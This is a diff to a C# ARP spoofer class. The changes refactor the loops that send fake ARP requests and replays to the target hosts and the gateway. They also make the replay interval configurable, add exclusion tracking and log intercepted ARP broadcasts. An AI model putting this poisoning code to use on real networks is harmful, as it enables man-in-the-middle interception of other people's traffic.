@@ -20,9 +20,10 @@ namespace Sentro.ARPSpoofer
     */
     public class ArpSpoofer : IArpSpoofer
     {
+        public const string Tag = "ArpSpoofer";
         private static ArpSpoofer _arpSpoofer;
         private Dictionary<string, string> _targetsIpToMac;
-        private Dictionary<string, string> _excludedTargets;//TODO: implement exclude targets
+        private HashSet<string> _excludedTargets;
         private HashSet<string> _targetsIps;
         private string _myMac,_gatewayIp,_gatewayMac;
         
@@ -40,7 +41,7 @@ namespace Sentro.ARPSpoofer
         private ArpSpoofer()
         {
             _targetsIpToMac = new Dictionary<string, string>();  
-            _excludedTargets = new Dictionary<string, string>();  
+            _excludedTargets = new HashSet<string>();
             _targetsPacketBuilders = new Dictionary<string, PacketBuilder>();
             _gatewayPacketBuilders = new Dictionary<string, PacketBuilder>();
         }
@@ -80,15 +81,16 @@ namespace Sentro.ARPSpoofer
                 
                 #region initiate attack
                 /*start poison with fake requests*/
-                for (int i = 0; i < targetsArray.Length; i++)
+                foreach (string target in targetsArray)
                 {
-                    SpoofGatewayInitialRequest(communicator, targetsArray[i]);
-                    SpoofTargetInitialRequest(communicator, targetsArray[i]);
+                    SpoofGatewayInitialRequest(communicator, target);
+                    SpoofTargetInitialRequest(communicator, target);
                 }
                 #endregion
 
                 #region keep attack alive
                 /*keep poison with replays*/
+                var settings = Settings.GetInstance();
                 while (_status == Status.Started || _status == Status.Starting || _status == Status.Paused)
                 {                    
                     if (_status == Status.Paused)
@@ -96,26 +98,27 @@ namespace Sentro.ARPSpoofer
                         Thread.Sleep(5000);
                         continue;
                     }
+
                     if (_targetsChanged)
                         targetsArray = _targetsIps.ToArray();
                     _status = Status.Started;
-                    for (int i = 0; i < targetsArray.Length; i++)
-                    {
-                        SpoofGateway(communicator,targetsArray[i]);
-                        SpoofTarget(communicator,targetsArray[i]);                        
-                    }                    
 
-                    /*TODO: make replays wait time variable*/
-                    Thread.Sleep(30000);
+                    foreach (string target in targetsArray)
+                    {
+                        SpoofGateway(communicator,target);
+                        SpoofTarget(communicator,target);
+                    }                    
+                    
+                    Thread.Sleep(Convert.ToInt32(settings.Setting.arpSpoofer.frequency));
                 }
                 #endregion
 
                 #region finish attack
                 /*end poison with real requests*/
-                for (int i = 0; i < targetsArray.Length; i++)
+                foreach (string target in targetsArray)
                 {
-                    SpoofGatewayFinalRequest(communicator, targetsArray[i]);
-                    SpoofTargetFinalRequest(communicator, targetsArray[i]);
+                    SpoofGatewayFinalRequest(communicator, target);
+                    SpoofTargetFinalRequest(communicator, target);
                 }
                 #endregion
 
@@ -130,6 +133,7 @@ namespace Sentro.ARPSpoofer
 
         private void FightBackAnnoyingBroadcasts(PacketCommunicator communicator)
         {
+            ILogger logger = ConsoleLogger.GetInstance();
             var ether = new EthernetLayer
             {
                 Source = new MacAddress(_myMac),
@@ -144,7 +148,8 @@ namespace Sentro.ARPSpoofer
                 {
                     var sourceIp = arp.Ethernet.IpV4.Source.ToString();
                     if (sourceIp.Equals(_gatewayIp))
-                    {
+                    {             
+                        logger.Log(Tag,LogLevel.Info,$"gateway asks for {arp.Ethernet.IpV4.Destination.ToString()}");           
                         var arplayer = new ArpLayer
                         {
                             ProtocolType = EthernetType.IpV4,
@@ -159,6 +164,7 @@ namespace Sentro.ARPSpoofer
                     }
                     else if (_targetsIpToMac.ContainsKey(sourceIp))
                     {
+                        logger.Log(Tag,LogLevel.Info,$"{sourceIp} asks for gateway");
                         SpoofGateway(communicator,sourceIp);
                     }
 
@@ -326,12 +332,14 @@ namespace Sentro.ARPSpoofer
         public void Exclude(string target)
         {
             _targetsIps.Remove(target);
+            _excludedTargets.Add(target);
             _targetsChanged = true;
         }
 
         public void Exclude(HashSet<string> targets)
         {
             _targetsIps.ExceptWith(targets);
+            _excludedTargets.UnionWith(targets);
             _targetsChanged = true;
         }
 
